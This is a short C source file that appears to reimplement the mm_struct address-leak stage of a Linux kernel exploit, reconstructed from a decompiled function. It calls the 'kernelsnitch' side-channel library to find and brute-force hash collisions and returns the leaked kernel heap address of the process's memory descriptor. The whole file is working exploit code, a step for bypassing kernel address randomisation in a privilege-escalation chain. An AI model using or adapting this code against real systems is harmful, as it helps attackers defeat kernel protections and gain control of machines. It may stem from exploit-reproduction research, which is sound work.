/* source: FUN_00106288's mm_struct leak stage, implemented via
 * kernelsnitch (see mm_leak.h for the match evidence). Constants below
 * match targets/afzh3/reference/kernel/legacy-target/target.h
 * (MM_STRUCT_SZ=0x400) and src/common.h defaults (MM_ORDER=3,
 * KSNITCH_COLLISIONS=4). */
#define _GNU_SOURCE
#include <sched.h>
#include <string.h>
#include <unistd.h>

#include "kernelsnitch/kernelsnitch.h"
#include "mm_leak.h"

#define OSS_MM_STRUCT_SZ 0x400
#define OSS_MM_ORDER 3
#define OSS_KSNITCH_COLLISIONS 4

int leak_own_mm_struct(uint64_t *mm_struct_out) {
  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  struct kernelsnitch_shared_state *ks = kernelsnitch_setup(
      OSS_MM_STRUCT_SZ, OSS_MM_ORDER, cpu_count, OSS_KSNITCH_COLLISIONS, 0,
      0);

  kernelsnitch_find_collisions(ks);
  if (!kernelsnitch_found_collisions(ks)) {
    kernelsnitch_cleanup(ks);
    return 0;
  }

  kernelsnitch_bruteforce(ks);
  size_t leaked = kernelsnitch_cleanup(ks);
  if (leaked == (size_t)-1) {
    return 0;
  }

  *mm_struct_out = (uint64_t)leaked;
  return 1;
}
